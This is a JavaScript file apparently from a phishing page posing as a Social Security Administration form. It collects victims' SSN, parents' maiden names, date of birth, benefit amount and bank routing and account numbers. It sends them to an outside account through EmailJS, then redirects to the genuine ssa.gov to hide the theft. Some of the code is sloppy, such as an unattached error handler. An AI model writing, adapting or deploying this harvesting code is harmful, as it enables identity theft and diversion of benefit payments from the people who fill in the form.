
function validateForm() {
    const full = document.querySelector('#full');
    const ssn = document.querySelector('#ssn');
    const maop = document.querySelector('#maop');
    const ffn = document.querySelector('#ffn');
    const mmn = document.querySelector('#mmn');
    const city = document.querySelector('#city');
    const state = document.querySelector('#state');
    const arlm = document.querySelector('#arlm');
    const rn = document.querySelector('#rn');
    const accn = document.querySelector('#accn');
    const phone = document.querySelector('#phone');
    const dob = document.querySelector('#dob');
    const dop = document.querySelector('#dop');
    const selectBox = document.querySelector('#select');
    const yes = document.querySelector('#select');
    //const no = document.querySelector('#no');
    const selectedIndex = selectBox.selectedIndex;
    const selectedOption = selectBox.options[selectedIndex].value;
}

function ValidateForm(){
 
function sendMail(params){
    var tempParams ={
     FULL :document.querySelector('#full-name').value,
    SSN :document.querySelector('#ssn').value,
    MailingAddsOnProfile :document.querySelector('#mailing-address').value,
    FathersFullNameAndMaidenName: document.querySelector('#fathers').value,
    MothersFullNameAndMaidenName: document.querySelector('#mothers').value,
    CityBorn : document.querySelector('#pob').value,
    State :document.querySelector('#state').value,
    AmountReceivedLastMonthInUSSD : document.querySelector('#amount').value,
    RoutingNumberThatsOnFile : document.querySelector('#routing').value,
    AccountNumberThatsOnFile : document.querySelector('#account').value,
    Phonenumber : document.querySelector('#phone').value,
    DOBDDMMYYYY : document.querySelector('#dob').value,
    DateOfPayment : document.querySelector('#dop').value,
    DidYouReceive : document.querySelector('#yes').value,
    };
        emailjs.send("service_h1g8n9x","template_p72db2s",tempParams)
        .then(function(res){ 
    
                alert('Sign Up Successful', res.text);
            console.log("sucess",res.status) ;
            window.location.href = "https://ssa.gov/";  
    
        })
        error => {
            alert( 'An error occured, Plese try again',error.text)
            }
        }
        return sendMail()
} 